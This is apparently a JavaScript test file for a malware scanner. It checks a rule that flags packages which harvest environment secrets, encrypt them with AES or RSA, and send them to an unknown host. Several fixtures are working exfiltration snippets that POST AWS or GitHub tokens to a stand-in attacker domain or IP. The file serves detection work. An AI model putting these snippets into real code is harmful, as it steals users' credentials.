'use strict';

const fs = require('fs');
const path = require('path');
const os = require('os');
const { asyncTest, assert, runScanDirect } = require('../test-utils');

function createTempDir() {
  return fs.mkdtempSync(path.join(os.tmpdir(), 'muaddib-crypto-exfil-'));
}
function cleanup(dir) {
  fs.rmSync(dir, { recursive: true, force: true });
}
async function writeAndScan(jsBody) {
  const tmp = createTempDir();
  try {
    fs.writeFileSync(path.join(tmp, 'package.json'), JSON.stringify({ name: 'crypto-exfil-fixture', version: '1.0.0' }));
    fs.writeFileSync(path.join(tmp, 'index.js'), jsBody);
    return await runScanDirect(tmp);
  } finally {
    cleanup(tmp);
  }
}

// A short, obviously-fake PEM SPKI public key — only the BEGIN marker matters to the detector.
const FAKE_PUBKEY = '-----BEGIN PUBLIC KEY-----\\n' +
  'MFwwDQYJKoZIhvcNAQEBBQADSwAwSAJBAKfakekeyfakekeyfakekeyfakekey0123\\n' +
  '-----END PUBLIC KEY-----';

async function runCryptoExfilTests() {
  console.log('\n=== CRYPTO-EXFIL TESTS (COMPOUND-019, RSA+AES hybrid exfil) ===\n');

  // ── Positives ───────────────────────────────────────────────────────────────

  await asyncTest('COMPOUND-019: harvest + RSA pubkey-wrap + AES + POST to unknown host fires crypto_exfil', async () => {
    const body = `
      const crypto = require('crypto');
      const https = require('https');
      const PUBKEY = \`${FAKE_PUBKEY}\`;
      const secret = process.env.AWS_SECRET_ACCESS_KEY;
      const aesKey = crypto.randomBytes(32);
      const iv = crypto.randomBytes(16);
      const cipher = crypto.createCipheriv('aes-256-cbc', aesKey, iv);
      const blob = cipher.update(secret, 'utf8', 'base64') + cipher.final('base64');
      const wrapped = crypto.publicEncrypt(PUBKEY, aesKey).toString('base64');
      const req = https.request({ host: 'exfil-9k2x.duckdns.org', path: '/u', method: 'POST' }, () => {});
      req.write(JSON.stringify({ blob, wrapped, iv: iv.toString('base64') })); req.end();
    `;
    const result = await writeAndScan(body);
    const compound = (result.threats || []).find(t => t.type === 'crypto_exfil');
    assert(compound, 'should fire crypto_exfil when env-secret harvest + RSA/AES encryption + network to a non-benign host are in the same file');
    assert(compound.severity === 'CRITICAL', 'crypto_exfil should be CRITICAL');
    assert(/embedded RSA\/EC public key/.test(compound.message), 'message should note the embedded public key when a PEM key is present');
  });

  await asyncTest('COMPOUND-019: harvest + AES-only (no embedded key) + POST to public IP fires crypto_exfil', async () => {
    const body = `
      const crypto = require('crypto');
      const http = require('http');
      const token = process.env.GITHUB_TOKEN;
      const cipher = crypto.createCipheriv('aes-256-gcm', Buffer.alloc(32), Buffer.alloc(12));
      const data = cipher.update(token, 'utf8', 'hex') + cipher.final('hex');
      const req = http.request({ host: '193.43.72.18', port: 80, method: 'POST' }, () => {});
      req.write(data); req.end();
    `;
    const result = await writeAndScan(body);
    const compound = (result.threats || []).find(t => t.type === 'crypto_exfil');
    assert(compound, 'should fire crypto_exfil with AES-only encryption (embedded key not required)');
    assert(!/embedded RSA\/EC public key/.test(compound.message), 'message should NOT claim an embedded key when none is present');
  });

  // ── Negatives (each isolates one gate) ───────────────────────────────────────

  await asyncTest('COMPOUND-019 negative: encrypt + send WITHOUT credential harvest does not fire (legit E2E lib)', async () => {
    const body = `
      const crypto = require('crypto');
      const https = require('https');
      const PUBKEY = \`${FAKE_PUBKEY}\`;
      function encryptAndSend(userMessage, recipientHost) {
        const aesKey = crypto.randomBytes(32);
        const iv = crypto.randomBytes(16);
        const cipher = crypto.createCipheriv('aes-256-cbc', aesKey, iv);
        const blob = cipher.update(userMessage, 'utf8', 'base64') + cipher.final('base64');
        const wrapped = crypto.publicEncrypt(PUBKEY, aesKey).toString('base64');
        const req = https.request({ host: recipientHost, method: 'POST' }, () => {});
        req.write(JSON.stringify({ blob, wrapped })); req.end();
      }
      module.exports = { encryptAndSend };
    `;
    const result = await writeAndScan(body);
    const compound = (result.threats || []).find(t => t.type === 'crypto_exfil');
    assert(!compound, 'crypto_exfil must NOT fire without a secret-harvest signal (E2E/signature libs encrypt user data, not stolen credentials)');
  });

  await asyncTest('COMPOUND-019 negative: harvest + encrypt + send ONLY to first-party provider does not fire (destAllBenign)', async () => {
    const body = `
      const crypto = require('crypto');
      const https = require('https');
      const apiKey = process.env.STRIPE_SECRET_KEY;
      const cipher = crypto.createCipheriv('aes-256-cbc', Buffer.alloc(32), Buffer.alloc(16));
      const enc = cipher.update(apiKey, 'utf8', 'base64') + cipher.final('base64');
      const req = https.request({ host: 'api.stripe.com', path: '/v1/charges', method: 'POST' }, () => {});
      req.write(enc); req.end();
    `;
    const result = await writeAndScan(body);
    const compound = (result.threats || []).find(t => t.type === 'crypto_exfil');
    assert(!compound, 'crypto_exfil must NOT fire when every destination is a curated first-party provider (api.stripe.com) — destAllBenign suppression');
  });

  await asyncTest('COMPOUND-019 negative: harvest + send WITHOUT an encryption primitive does not fire', async () => {
    const body = `
      const https = require('https');
      const secret = process.env.AWS_SECRET_ACCESS_KEY;
      const req = https.request({ host: 'exfil-9k2x.duckdns.org', method: 'POST' }, () => {});
      req.write(secret); req.end();
    `;
    const result = await writeAndScan(body);
    const compound = (result.threats || []).find(t => t.type === 'crypto_exfil');
    assert(!compound, 'crypto_exfil must NOT fire without an encryption primitive (plain credential exfil is covered by other rules, not this compound)');
  });
}

module.exports = { runCryptoExfilTests };
